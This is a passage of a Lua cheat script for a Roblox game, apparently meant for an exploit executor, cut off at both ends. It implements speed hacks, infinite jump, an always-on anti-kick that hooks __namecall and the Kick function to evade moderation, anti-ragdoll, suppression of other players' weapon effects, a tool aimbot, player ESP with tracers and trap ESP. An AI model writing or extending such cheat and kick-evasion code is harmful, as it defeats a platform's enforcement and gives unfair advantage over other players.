 if anyHeld and _spd.lastMoveDir and _spd.lastMoveDir.Magnitude > 0.01 then
 dir = _spd.lastMoveDir
 end
 end
 if dir.Magnitude > 0.01 then
 applySpeedMethod(hrp, hum, dir.Unit, spd, dt)
 else
 destroySpeedObjects()
 end
	end)
end

function setSpeedOn(on)
	St.speedOn = on and true or false
	if St.speedOn then startSpeedBoost() else stopSpeedBoost() end
	saveCfg()
end

function setActiveMode(mode)
	if not St.modes[mode] then return end
	St.activeMode = mode
	currentSpeedValue = getActiveMoveSpeed()
	if St.speedOn then
 startSpeedBoost() -- restart Empire loop
	end
	if _G.IlusionRefreshModeBar then pcall(_G.IlusionRefreshModeBar) end
	if _G.IlusionRefreshV2ModeBar then pcall(_G.IlusionRefreshV2ModeBar) end
	if _G.IlusionRefreshModeCards then pcall(_G.IlusionRefreshModeCards) end
	pcall(saveCfg)
end

----------------------------------------------------------------
-- INFINITE JUMP — FULL EMPIRE (hold + manual 2 mode)
----------------------------------------------------------------
InfJumpState = { enabled = false, mode = "hold", jumpHeld = false }
local _holdInfJumpConn = nil

function stopHoldInfJump()
	if _holdInfJumpConn then
 pcall(function() _holdInfJumpConn:Disconnect() end)
 _holdInfJumpConn = nil
	end
end

function startHoldInfJump()
	stopHoldInfJump()
	-- FULL Empire hold infinite jump (Velocity)
	_holdInfJumpConn = RS.Heartbeat:Connect(function()
 if not InfJumpState.enabled then return end
 local char = LP.Character
 if not char then return end
 local root = char:FindFirstChild("HumanoidRootPart")
 local hum = char:FindFirstChildOfClass("Humanoid")
 if not root or not hum then return end
 local isJumpHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or (hum.Jump == true) or (InfJumpState.jumpHeld == true)
 local vel = root.Velocity
 pcall(function()
 local av = root.AssemblyLinearVelocity
 if av then vel = av end
 end)
 if isJumpHeld and vel.Y < 35 then
 local nv = Vector3.new(vel.X, 55, vel.Z)
 pcall(function() root.Velocity = nv end)
 pcall(function() root.AssemblyLinearVelocity = nv end)
 end
 if vel.Y < -120 then
 local nv = Vector3.new(vel.X, -120, vel.Z)
 pcall(function() root.Velocity = nv end)
 pcall(function() root.AssemblyLinearVelocity = nv end)
 end
	end)
end

function startInfJump()
	InfJumpState.enabled = true
	InfJumpState.mode = St.infJumpMode or "hold"
	startHoldInfJump()
end

function stopInfJump()
	InfJumpState.enabled = false
	InfJumpState.jumpHeld = false
	stopHoldInfJump()
end

function setInfJump(on)
	St.infJump = on and true or false
	if St.infJump then startInfJump() else stopInfJump() end
	saveCfg()
end

function setInfJumpMode(mode)
	-- "hold" | "manual" — Empire dùng cùng loop; manual chỉ pulse jumpHeld
	St.infJumpMode = mode
	InfJumpState.mode = mode
	if St.infJump then startInfJump() end
	saveCfg()
end

-- Mobile JumpButton + Space (Empire)
if not _G._VisEmpireJumpHook then
	_G._VisEmpireJumpHook = true
	task.spawn(function()
 local pg = LP:WaitForChild("PlayerGui", 15)
 if not pg then return end
 local function hookJumpButton(btn)
 if btn:IsA("GuiButton") and btn.Name == "JumpButton" and not btn:GetAttribute("IlusionInfJumpHooked") then
 btn:SetAttribute("IlusionInfJumpHooked", true)
 btn.MouseButton1Down:Connect(function()
 if InfJumpState.enabled then InfJumpState.jumpHeld = true end
 end)
 btn.MouseButton1Up:Connect(function()
 InfJumpState.jumpHeld = false
 end)
 end
 end
 for _, d in ipairs(pg:GetDescendants()) do hookJumpButton(d) end
 pg.DescendantAdded:Connect(hookJumpButton)
	end)
	UIS.JumpRequest:Connect(function()
 if not InfJumpState.enabled then return end
 if InfJumpState.mode == "manual" then
 InfJumpState.jumpHeld = true
 task.defer(function() InfJumpState.jumpHeld = false end)
 end
	end)
	UIS.InputEnded:Connect(function(inp)
 if inp.KeyCode == Enum.KeyCode.Space then
 InfJumpState.jumpHeld = false
 end
	end)
end


-- ANTI KICK (Empire full) — LUÔN BẬT, không bao giờ OFF
----------------------------------------------------------------
local AntiKickState = { enabled = true, brainrotDetected = false, conn = nil }
function enableAntiKick()
	AntiKickState.enabled = true
	St.antiKick = true
	-- namecall Kick shield (executor)
	pcall(function()
 if hookmetamethod and not _G._FAGAntiKickHooked then
 _G._FAGAntiKickHooked = true
 local old
 old = hookmetamethod(game, "__namecall", function(self, ...)
 local method = (getnamecallmethod and getnamecallmethod()) or ""
 if tostring(method) == "Kick" then
 if self == LP or (typeof(self) == "Instance" and self:IsA("Player") and self == LP) then
 return -- block LocalPlayer:Kick
 end
 end
 return old(self, ...)
 end)
 end
	end)
	-- block Players.LocalPlayer:Kick via hookfunction if available
	pcall(function()
 if hookfunction and not _G._FAGKickFnHooked then
 _G._FAGKickFnHooked = true
 local oldKick = LP.Kick
 if typeof(oldKick) == "function" then
 hookfunction(oldKick, function(self, ...)
 return -- never kick self
 end)
 end
 end
	end)
	if AntiKickState.conn then return end
	AntiKickState.conn = task.spawn(function()
 while true do -- forever
 AntiKickState.enabled = true
 St.antiKick = true
 task.wait(0.5)
 local char = LP.Character
 local found = false
 if char then
 for _, tool in ipairs(char:GetChildren()) do
 if tool:IsA("Tool") then
 local n = tool.Name:lower()
 if n:find("brainrot") or n:find("skibidi") or n:find("toilet") then
 found = true
 break
 end
 end
 end
 end
 AntiKickState.brainrotDetected = found
 end
	end)
end
function disableAntiKick()
	-- KHÔNG BAO GIỜ TẮT — bỏ qua
	enableAntiKick()
end
function setAntiKick(on)
	enableAntiKick()
	saveCfg()
end
task.defer(enableAntiKick)



-- Anti Ragdoll V1=Splatter / V2=No Splatter (full Vynx logic)
AntiRagdollV2 = AntiRagdollV2 or { Connection = nil, Enabled = false, ResetCooldown = 0 }
St.antiRagdollMode = St.antiRagdollMode or "V1" -- V1=Splatter, V2=No Splatter

function forceNoSplatterReset()
	local char = LP.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local root = char:FindFirstChild("HumanoidRootPart")
	if not hum or not root or hum.Health <= 0 then return end
	pcall(function()
 hum:ChangeState(Enum.HumanoidStateType.GettingUp)
 root.Velocity = Vector3.zero
 root.RotVelocity = Vector3.zero
 root.AssemblyLinearVelocity = Vector3.zero
 root.AssemblyAngularVelocity = Vector3.zero
 for _, obj in ipairs(char:GetDescendants()) do
 if obj:IsA("Motor6D") then obj.Enabled = true end
 if obj:IsA("Constraint") then obj.Enabled = true end
 end
 workspace.CurrentCamera.CameraSubject = hum
 local PM = LP:FindFirstChild("PlayerScripts") and LP.PlayerScripts:FindFirstChild("PlayerModule")
 if PM then
 local ok, CM = pcall(function() return require(PM:FindFirstChild("ControlModule")) end)
 if ok and CM and CM.Enable then pcall(function() CM:Enable() end) end
 end
 hum.AutoRotate = true
 hum.PlatformStand = false
 hum.Sit = false
	end)
end

function startAntiRagdoll()
	stopAntiRagdoll()
	AntiRagdollV2.Enabled = true
	AntiRagdollV2.Connection = RS.Heartbeat:Connect(function()
 if not AntiRagdollV2.Enabled or not St.antiRagdoll then return end
 local char = LP.Character
 if not char then return end
 local hum = char:FindFirstChildOfClass("Humanoid")
 local root = char:FindFirstChild("HumanoidRootPart")
 if not hum or hum.Health <= 0 then return end
 local state = hum:GetState()
 local ragdolled = (state == Enum.HumanoidStateType.Physics
 or state == Enum.HumanoidStateType.Ragdoll
 or state == Enum.HumanoidStateType.FallingDown)
 local mode = tostring(St.antiRagdollMode or "V1"):upper()
 -- V2 = No Splatter (Vynx)
 if mode == "V2" or mode == "NO SPLATTER" then
 if ragdolled then
 local now = tick()
 if now - (AntiRagdollV2.ResetCooldown or 0) > 0.15 then
 AntiRagdollV2.ResetCooldown = now
 forceNoSplatterReset()
 end
 end
 return
 end
 -- V1 = Splatter (Vynx): clear constraints + Running
 if not root then return end
 local endTime = LP:GetAttribute("RagdollEndTime")
 if endTime and (endTime - workspace:GetServerTimeNow()) > 0 then
 ragdolled = true
 end
 if ragdolled then
 pcall(function()
 LP:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
 end)
 for _, d in ipairs(char:GetDescendants()) do
 if d:IsA("BallSocketConstraint") or
 (d:IsA("Attachment") and tostring(d.Name):find("RagdollAttachment")) then
 d:Destroy()
 end
 end
 for _, obj in ipairs(char:GetDescendants()) do
 if obj:IsA("Motor6D") and obj.Enabled == false then
 obj.Enabled = true
 end
 end
 if hum.Health > 0 then
 hum:ChangeState(Enum.HumanoidStateType.Running)
 end
 pcall(function() workspace.CurrentCamera.CameraSubject = hum end)
 root.Anchored = false
 root.AssemblyLinearVelocity = Vector3.zero
 root.AssemblyAngularVelocity = Vector3.zero
 end
	end)
end

function stopAntiRagdoll()
	AntiRagdollV2.Enabled = false
	if AntiRagdollV2.Connection then
 pcall(function() AntiRagdollV2.Connection:Disconnect() end)
 AntiRagdollV2.Connection = nil
	end
	AntiRagdollV2.ResetCooldown = 0
end

function setAntiRagdoll(on)
	St.antiRagdoll = on and true or false
	if St.antiRagdoll then
 startAntiRagdoll()
	else
 stopAntiRagdoll()
	end
	pcall(saveCfg)
end

function setAntiRagdollMode(mode)
	mode = tostring(mode or "V1"):upper()
	if mode == "V2" or mode == "NO SPLATTER" or mode == "NOSPLATTER" then
 St.antiRagdollMode = "V2"
	else
 St.antiRagdollMode = "V1"
	end
	if St.antiRagdoll then
 stopAntiRagdoll()
 startAntiRagdoll()
	end
	pcall(function() if _G.IlusionRefreshAntiRagMode then _G.IlusionRefreshAntiRagMode() end end)
	pcall(saveCfg)
end
_G.IlusionSetAntiRagdollMode = setAntiRagdollMode



----------------------------------------------------------------
-- ANTI GUMMY / BOOGIE / PAINTBALL (ILUSIÓN full) — LUÔN BẬT
--------------------------------------------------------------
-- Anti Gummy / Boogie / Bee / Paintball (from Tp Heatseeker)
-- Always ON, no GUI
-- ============================================================
if not _G._FAG_VisAntiGummyFullLoaded then
	_G._FAG_VisAntiGummyFullLoaded = true
	task.spawn(function()
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local Lighting = game:GetService("Lighting")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer

 local AntiGummy, AntiBoogie, AntiBee = true, true, false -- no Anti Bee
 local ANTI_PAINTBALL_ALWAYS_ON = true

 local function ResetTool(Char)
 if not Char then Char = LocalPlayer.Character end
 if not Char then return end
 pcall(function()
 LocalPlayer:SetAttribute("BlockTools", false)
 LocalPlayer:SetAttribute("Web", false)
 Char:SetAttribute("BackpackReady", true)
 end)
 end

 local function ClearEffect()
 if AntiBee then
 for _, V in pairs(Lighting:GetChildren()) do
 if V.Name == "BeeBlur" or V.Name == "Flashbang" then
 pcall(function() V:Destroy() end)
 end
 end
 local Ctrl = ReplicatedStorage:FindFirstChild("Controllers")
 if Ctrl then
 local BC = Ctrl:FindFirstChild("BeeLauncherController")
 if BC then
 local B = BC:FindFirstChild("Buzzing")
 if B then pcall(function() B:Stop() end) end
 end
 end
 end
 if AntiBoogie then
 for _, V in pairs(Lighting:GetChildren()) do
 if V.Name == "DiscoEffect" then
 pcall(function() V:Destroy() end)
 end
 end
 local Ctrl = ReplicatedStorage:FindFirstChild("Controllers")
 if Ctrl then
 local BC = Ctrl:FindFirstChild("BoogieBombController")
 if BC then
 local B = BC:FindFirstChild("BOOM")
 if B then pcall(function() B:Stop() end) end
 end
 end
 end
 end

 local function getMainHudGui()
 local pg = LocalPlayer:FindFirstChild("PlayerGui")
 return pg and pg:FindFirstChild("Main")
 end

 local function isPaintballSplatGui(gui)
 if not gui or gui.Parent ~= getMainHudGui() then return false end
 if not (gui:IsA("ImageLabel") or gui:IsA("ImageButton")) then return false end
 if gui:GetAttribute("__UGPaintballIgnore") or gui:GetAttribute("__UGPaintballShrunk") then return false end
 return math.abs(gui.Rotation) > 0.01
 end

 local function shrinkPaintballSplat(gui)
 if not gui or gui:GetAttribute("__UGPaintballShrunk") then return end
 gui:SetAttribute("__UGPaintballShrunk", true)
 gui.Size = UDim2.fromOffset(6, 6)
 end

 local function runAntiPaintballSweep()
 if not ANTI_PAINTBALL_ALWAYS_ON then return end
 task.spawn(function()
 for _ = 1, 8 do
 local main = getMainHudGui()
 if not main then break end
 for _, c in ipairs(main:GetChildren()) do
 if isPaintballSplatGui(c) then
 pcall(shrinkPaintballSplat, c)
 end
 end
 task.wait(0.05)
 end
 end)
 end

 -- Paintball continuous sweep
 task.spawn(function()
 while task.wait(0.25) do
 if ANTI_PAINTBALL_ALWAYS_ON then
 pcall(runAntiPaintballSweep)
 end
 end
 end)

 -- Heartbeat: Anti Gummy + Boogie/Bee
 RunService.Heartbeat:Connect(function()
 if AntiGummy then
 pcall(ResetTool)
 end
 if AntiBoogie or AntiBee then
 pcall(ClearEffect)
 end
 end)

 -- Also clear on Lighting child added (instant)
 pcall(function()
 Lighting.ChildAdded:Connect(function(child)
 if not child then return end
 local n = child.Name
 if AntiBee and (n == "BeeBlur" or n == "Flashbang") then
 task.defer(function() pcall(function() child:Destroy() end) end)
 end
 if AntiBoogie and n == "DiscoEffect" then
 task.defer(function() pcall(function() child:Destroy() end) end)
 end
 end)
 end)

 -- Paintball: shrink when new splat appears on Main HUD
 pcall(function()
 local function hookMain(main)
 if not main or main:GetAttribute("_VisAntiPaintballHooked") then return end
 main:SetAttribute("_VisAntiPaintballHooked", true)
 main.ChildAdded:Connect(function(c)
 task.defer(function()
 if isPaintballSplatGui(c) then
 pcall(shrinkPaintballSplat, c)
 end
 end)
 end)
 end
 local pg = LocalPlayer:FindFirstChild("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui", 10)
 if pg then
 hookMain(pg:FindFirstChild("Main"))
 pg.ChildAdded:Connect(function(ch)
 if ch.Name == "Main" then
 task.defer(function() hookMain(ch) end)
 end
 end)
 end
 end)

 -- CharacterAdded: ensure tools unblocked
 LocalPlayer.CharacterAdded:Connect(function(char)
 task.defer(function()
 pcall(ResetTool, char)
 end)
 end)

 print("[Vis AllGear] Anti Gummy / Boogie / Bee / Paintball ON (silent)")
	end)
end

-- Setters: luôn ON, không OFF được
function setAntiGummy(on)
	St.antiGummy = true
	AntiFX.gummy = true
	saveCfg()
end
function setAntiBoogie(on)
	St.antiBoogie = true
	AntiFX.boogie = true
	saveCfg()
end
function setAntiPaint(on)
	St.antiPaint = true
	AntiFX.paint = true
	saveCfg()
end

----------------------------------------------------------------
-- TOOL AIMBOT (ILUSIÓN full) — LUÔN BẬT
----------------------------------------------------------------
local aimOn = true
local TOOLS = { ["Web Slinger"] = true, ["Paintball Gun"] = true, ["Laser Cape"] = true }
local hooked = {}
local mouseMod, lastAimUp = nil, 0
function getMouse()
	if mouseMod then return mouseMod end
	pcall(function()
 local pkg = ReplicatedStorage:FindFirstChild("Packages")
 if pkg then mouseMod = require(pkg:WaitForChild("PlayerMouse", 5)) end
	end)
	return mouseMod
end
function bestEnemy()
	local char = LP.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	local cam = workspace.CurrentCamera
	if not root or not cam then return nil end
	local best, score = nil, math.huge
	local camPos, camDir = cam.CFrame.Position, cam.CFrame.LookVector
	for _, plr in ipairs(Players:GetPlayers()) do
 if plr ~= LP and plr.Character then
 local r = plr.Character:FindFirstChild("HumanoidRootPart")
 local h = plr.Character:FindFirstChildOfClass("Humanoid")
 if r and h and h.Health > 0 then
 local d = (r.Position - root.Position).Magnitude
 if d <= 100 then
 local to = r.Position - camPos
 if to.Magnitude > 0.01 then
 local ang = math.deg(math.acos(math.clamp(camDir:Dot(to.Unit), -1, 1)))
 local sc = d + (ang > 200 and 1000 or 0)
 if sc < score then score, best = sc, r end
 end
 end
 end
 end
	end
	return best
end
function overrideMouse()
	if not aimOn then return end
	local pm = getMouse()
	if not pm then return end
	local e = bestEnemy()
	if e and e.Parent then
 local vel = e.AssemblyLinearVelocity or Vector3.zero
 pcall(function()
 pm.Hit = CFrame.new(e.Position + vel * 0.1)
 pm.Target = e
 end)
	end
end
function hookTool(tool)
	if hooked[tool] or not tool then return end
	hooked[tool] = true
	tool.Activated:Connect(overrideMouse)
	tool.Equipped:Connect(function()
 task.wait(0.1)
 local pm = getMouse()
 if pm and aimOn then
 local old = pm.Button1Down
 pm.Button1Down = function(...)
 overrideMouse()
 if old then old(...) end
 end
 end
	end)
end
function watchTools(parent)
	if not parent then return end
	for _, c in ipairs(parent:GetChildren()) do
 if TOOLS[c.Name] then hookTool(c) end
	end
	parent.ChildAdded:Connect(function(c)
 task.wait(0.05)
 if TOOLS[c.Name] then hookTool(c) end
	end)
end
watchTools(LP.Backpack)
if LP.Character then watchTools(LP.Character) end
LP.CharacterAdded:Connect(function(c)
	task.wait(0.2)
	watchTools(c)
	watchTools(LP.Backpack)
end)
RS.RenderStepped:Connect(function()
	if not aimOn then return end
	if tick() - lastAimUp > 0.1 then lastAimUp = tick(); bestEnemy() end
	if UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then overrideMouse() end
end)
function setToolAim(on)
	-- LUÔN BẬT tool aimbot
	aimOn = true
	St.toolAim = true
	local char = LP.Character
	if char then pcall(watchTools, char) end
	local bp = LP:FindFirstChild("Backpack")
	if bp then pcall(watchTools, bp) end
	saveCfg()
end
-- boot tool aim
task.defer(function()
	aimOn = true
	St.toolAim = true
	pcall(function()
 if LP.Character then watchTools(LP.Character) end
 if LP.Backpack then watchTools(LP.Backpack) end
	end)
end)

----------------------------------------------------------------
-- DROP JUMP / STAND (Vis Clean)
----------------------------------------------------------------
local dropActive = false
local DROP_SPD, DROP_DUR = 200, 0.28
function runDrop()
	if dropActive then return end
	local char = LP.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not root or not hum then return end
	local mode = tonumber(St.dropMode) or 2
	if mode == 1 then
 -- Stand / Fling style burst
 dropActive = true
 local t0 = tick()
 local conn
 conn = RS.Heartbeat:Connect(function()
 if not dropActive or tick() - t0 > 0.25 then
 if conn then conn:Disconnect() end
 dropActive = false
 if root and root.Parent then
 root.AssemblyLinearVelocity = Vector3.zero
 end
 return
 end
 local r = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not r then return end
 local v = Vector3.new(0, r.AssemblyLinearVelocity.Y, 0)
 r.AssemblyLinearVelocity = v * 10000 + Vector3.new(0, 10000, 0)
 end)
 return
	end
	-- Jump ascend
	dropActive = true
	local t0 = tick()
	local conn
	conn = RS.Heartbeat:Connect(function()
 local c = LP.Character
 local r = c and c:FindFirstChild("HumanoidRootPart")
 if not r or not dropActive then
 if conn then conn:Disconnect() end
 dropActive = false
 return
 end
 if tick() - t0 >= DROP_DUR then
 if conn then conn:Disconnect() end
 local rp = RaycastParams.new()
 rp.FilterDescendantsInstances = { c }
 rp.FilterType = Enum.RaycastFilterType.Exclude
 local rr = workspace:Raycast(r.Position, Vector3.new(0, -3000, 0), rp)
 if rr then
 local h2 = c:FindFirstChildOfClass("Humanoid")
 local off = ((h2 and h2.HipHeight) or 2) + (r.Size.Y / 2)
 r.CFrame = CFrame.new(r.Position.X, rr.Position.Y + off, r.Position.Z)
 end
 r.AssemblyLinearVelocity = Vector3.zero
 r.AssemblyAngularVelocity = Vector3.zero
 dropActive = false
 return
 end
 r.AssemblyLinearVelocity = Vector3.new(r.AssemblyLinearVelocity.X, DROP_SPD, r.AssemblyLinearVelocity.Z)
	end)
end

----------------------------------------------------------------
-- INSTA RESET V1 / V2 (Vis)
----------------------------------------------------------------
local _resetBusy = false
local _resetCD = false
local INST_V2_POS = CFrame.new(2000.5, 9911.9, 4000.2)
function InstaResetV2()
	if _resetBusy then return end
	local char = LP.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not hrp or not hum then return end
	_resetBusy = true
	local cam = workspace.CurrentCamera
	local lockCF = cam and cam.CFrame
	pcall(function()
 if cam then cam.CameraType = Enum.CameraType.Scriptable; cam.CFrame = lockCF end
 RS:BindToRenderStep("IlusionInstaV2Cam", Enum.RenderPriority.Camera.Value + 1, function()
 pcall(function()
 if cam then cam.CameraType = Enum.CameraType.Scriptable; if lockCF then cam.CFrame = lockCF end end
 local ac = LP.Character
 local ah = ac and ac:FindFirstChild("HumanoidRootPart")
 if ah then
 ah.AssemblyLinearVelocity = Vector3.zero
 ah.CFrame = INST_V2_POS
 end
 end)
 end)
	end)
	local conn
	conn = LP.CharacterAdded:Connect(function(newChar)
 if conn then conn:Disconnect() end
 pcall(function() RS:UnbindFromRenderStep("IlusionInstaV2Cam") end)
 local nh = newChar:WaitForChild("Humanoid", 5)
 task.wait(0.05)
 pcall(function()
 if cam and nh then cam.CameraSubject = nh; cam.CameraType = Enum.CameraType.Custom end
 end)
 _resetBusy = false
	end)
	task.delay(8, function()
 if _resetBusy then
 pcall(function() RS:UnbindFromRenderStep("IlusionInstaV2Cam") end)
 _resetBusy = false
 end
	end)
end

function InstaResetV1()
	-- V1: HipHeight kill — KHÔNG khóa camera, vẫn xoay ngang/dọc bình thường
	if _resetCD then return end
	local character = LP.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	local hrp = character and character:FindFirstChild("HumanoidRootPart")
	if not character or not humanoid or not hrp then return end
	_resetCD = true
	_resetBusy = true
	local originalHip = humanoid.HipHeight
	local cam = workspace.CurrentCamera

	-- Giữ camera Custom — người chơi tự xoay, không Scriptable / không BindToRenderStep
	pcall(function()
 if cam then
 cam.CameraType = Enum.CameraType.Custom
 if humanoid then cam.CameraSubject = humanoid end
 end
 pcall(function() RS:UnbindFromRenderStep("IlusionInstaV1Cam") end)
 pcall(function() RS:UnbindFromRenderStep("IlusionInstaV2Cam") end)
	end)

	local charConn
	charConn = LP.CharacterAdded:Connect(function(newChar)
 if charConn then charConn:Disconnect() end
 local nh = newChar:WaitForChild("Humanoid", 5)
 task.wait(0.05)
 pcall(function()
 local c = workspace.CurrentCamera
 if c and nh then
 c.CameraSubject = nh
 c.CameraType = Enum.CameraType.Custom
 end
 end)
 _resetCD = false
 _resetBusy = false
	end)

	task.spawn(function()
 local attempts = 0
 while character and character.Parent and humanoid and attempts < 40 do
 if LP.Character ~= character then break end
 pcall(function()
 humanoid.PlatformStand = false
 humanoid.Sit = false
 pcall(function() humanoid:ChangeState(Enum.HumanoidStateType.GettingUp) end)
 pcall(function() humanoid:ChangeState(Enum.HumanoidStateType.Running) end)
 humanoid.HipHeight = 1e30
 humanoid.AutoRotate = true
 local rp = character:FindFirstChild("HumanoidRootPart")
 if rp then rp.CanCollide = false end
 for _, part in ipairs(character:GetChildren()) do
 if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
 part.CanCollide = false
 end
 end
 -- camera vẫn Custom mỗi frame (phòng script khác đổi)
 if cam then
 cam.CameraType = Enum.CameraType.Custom
 cam.CameraSubject = humanoid
 end
 end)
 if humanoid.Health <= 0 or humanoid:GetState() == Enum.HumanoidStateType.Dead then break end
 attempts = attempts + 1
 task.wait(0.05)
 end
 if character and character.Parent and humanoid and humanoid.Health > 0 then
 pcall(function() humanoid.Health = 0 end)
 end
 if character and character.Parent and humanoid then
 pcall(function()
 humanoid.HipHeight = originalHip
 local rp = character:FindFirstChild("HumanoidRootPart")
 if rp then rp.CanCollide = true end
 end)
 end
 task.delay(5, function()
 if _resetBusy then
 _resetCD = false
 _resetBusy = false
 end
 end)
	end)
end

function doInstaReset()
	if St.instaMode == "V2" then InstaResetV2() else InstaResetV1() end
end

----------------------------------------------------------------
-- TP DOWN (Vis)
----------------------------------------------------------------
function doTPDown(force)
	local char = LP.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not hrp or not hum or hum.Health <= 0 then return end
	if not force then
 if hum.FloorMaterial ~= Enum.Material.Air then return end
 if hrp.Position.Y < 20 then return end
	end
	hrp.CFrame = CFrame.new(hrp.Position.X, -7, hrp.Position.Z)
 * CFrame.Angles(0, select(2, hrp.CFrame:ToEulerAnglesYXZ()), 0)
	hrp.AssemblyLinearVelocity = Vector3.zero
end

----------------------------------------------------------------
-- ESP + TRACER + ANTI LAG
----------------------------------------------------------------
local ESP = { on = false, data = {}, conns = {} }
function espCleanup(plr)
	local d = ESP.data[plr]
	if not d then return end
	pcall(function() if d.hl then d.hl:Destroy() end end)
	pcall(function() if d.bb then d.bb:Destroy() end end)
	pcall(function() if d.tracer then d.tracer:Remove() end end)
	ESP.data[plr] = nil
end
function espSetup(plr, char)
	if not ESP.on or plr == LP or not char then return end
	espCleanup(plr)
	local hrp = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 3)
	local head = char:FindFirstChild("Head")
	if not hrp then return end
	local hl = Instance.new("Highlight")
	hl.Adornee = char
	hl.FillColor = Color3.fromRGB(35, 35, 35)
	hl.FillTransparency = 0.7
	hl.OutlineColor = Color3.fromRGB(255, 255, 255)
	hl.OutlineTransparency = 0
	hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	hl.Parent = char
	local bb, tracer
	if head then
 bb = Instance.new("BillboardGui")
 bb.Adornee = head
 bb.Size = UDim2.new(0, 100, 0, 20)
 bb.StudsOffset = Vector3.new(0, 2.5, 0)
 bb.AlwaysOnTop = true
 bb.Parent = head
 local t = Instance.new("TextLabel", bb)
 t.Size = UDim2.new(1, 0, 1, 0)
 t.BackgroundTransparency = 1
 t.Text = plr.DisplayName or plr.Name
 t.TextColor3 = Color3.new(1, 1, 1)
 t.TextSize = 12
 t.Font = Enum.Font.GothamBold
 t.TextStrokeTransparency = 0.5
	end
	if St.tracer then
 tracer = Drawing and Drawing.new and Drawing.new("Line")
 if tracer then
 tracer.Thickness = 1
 tracer.Color = Color3.fromRGB(255, 255, 255)
 tracer.Visible = true
 end
	end
	ESP.data[plr] = { hl = hl, bb = bb, tracer = tracer, hrp = hrp }
end
function startESP()
	if ESP.on then return end
	ESP.on = true
	for _, plr in ipairs(Players:GetPlayers()) do
 if plr ~= LP and plr.Character then espSetup(plr, plr.Character) end
 table.insert(ESP.conns, plr.CharacterAdded:Connect(function(c)
 task.defer(espSetup, plr, c)
 end))
	end
	table.insert(ESP.conns, Players.PlayerAdded:Connect(function(plr)
 table.insert(ESP.conns, plr.CharacterAdded:Connect(function(c)
 task.defer(espSetup, plr, c)
 end))
	end))
	table.insert(ESP.conns, RS.RenderStepped:Connect(function()
 if not St.tracer then return end
 local cam = workspace.CurrentCamera
 local my = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not cam or not my then return end
 local origin = cam:WorldToViewportPoint(my.Position)
 for plr, d in pairs(ESP.data) do
 if d.tracer and d.hrp and d.hrp.Parent then
 local p, onScreen = cam:WorldToViewportPoint(d.hrp.Position)
 d.tracer.From = Vector2.new(origin.X, origin.Y)
 d.tracer.To = Vector2.new(p.X, p.Y)
 d.tracer.Visible = onScreen and p.Z > 0
 elseif d.tracer then
 d.tracer.Visible = false
 end
 end
	end))
end
function stopESP()
	ESP.on = false
	for _, c in ipairs(ESP.conns) do pcall(function() c:Disconnect() end) end
	ESP.conns = {}
	for plr in pairs(ESP.data) do espCleanup(plr) end
end
function setESP(on)
	St.esp = on
	if on then startESP() else stopESP() end
	saveCfg()
end
function setTracer(on)
	St.tracer = on
	if St.esp then stopESP(); startESP() end
	saveCfg()
end

----------------------------------------------------------------
-- TRAP ESP — highlight + label on traps in workspace
----------------------------------------------------------------
local TrapESP = {
	on = false,
	data = {}, -- [Instance] = { hl, bb }
	conns = {},
	scanToken = 0,
}

local TRAP_NAME_KEYS = {
	"trap", "beartrap", "bear trap", "spike", "landmine", "mine",
	"snare", "clawtrap", "rattrap", "mousetrap", "floortrap",
	"trampa", "pinchos", "mina",
}

local function isTrapCandidate(inst)
	if not inst or not inst.Parent then return false end
	local n = string.lower(tostring(inst.Name or ""))
	for _, key in ipairs(TRAP_NAME_KEYS) do
		if string.find(n, key, 1, true) then
			return true
		end
	end
	-- Attribute / tag style
	local ok, attr = pcall(function() return inst:GetAttribute("IsTrap") or inst:GetAttribute("Trap") end)
	if ok and attr then return true end
	return false
end

local function trapRootPart(inst)
	if inst:IsA("BasePart") then return inst end
	if inst:IsA("Model") then
		if inst.PrimaryPart then return inst.PrimaryPart end
		local p = inst:FindFirstChildWhichIsA("BasePart", true)
		return p
	end
	return inst:FindFirstChildWhichIsA("BasePart", true)
end

local function trapCleanupOne(inst)
	local d = TrapESP.data[inst]
	if not d then return end
	pcall(function() if d.hl then d.hl:Destroy() end end)
	pcall(function() if d.bb then d.bb:Destroy() end end)
	TrapESP.data[inst] = nil
end

local function trapCleanupAll()
	for inst in pairs(TrapESP.data) do
		trapCleanupOne(inst)
	end
	TrapESP.data = {}
end

local function trapAttach(inst)
	if not TrapESP.on or not inst or not inst.Parent then return end
	if TrapESP.data[inst] then return end
	if not isTrapCandidate(inst) then return end
	-- Prefer model root if part is under a trap model
	local root = inst
	if inst:IsA("BasePart") then
		local m = inst:FindFirstAncestorOfClass("Model")
		if m and isTrapCandidate(m) then root = m end
	end
	if TrapESP.data[root] then return end
	local part = trapRootPart(root)
	if not part then return end

	local hl = Instance.new("Highlight")
	hl.Name = "IlusionTrapESP"
	hl.Adornee = root:IsA("Model") and root or part
	hl.FillColor = Color3.fromRGB(255, 60, 60)
	hl.OutlineColor = Color3.fromRGB(255, 200, 80)
	hl.FillTransparency = 0.55
	hl.OutlineTransparency = 0
	hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	hl.Parent = root:IsA("Model") and root or part

	local bb = Instance.new("BillboardGui")
	bb.Name = "IlusionTrapESPLabel"
	bb.Size = UDim2.fromOffset(90, 28)
	bb.StudsOffset = Vector3.new(0, 2.2, 0)
	bb.AlwaysOnTop = true
	bb.MaxDistance = 400
	bb.Adornee = part
	bb.Parent = part

	local lbl = Instance.new("TextLabel")
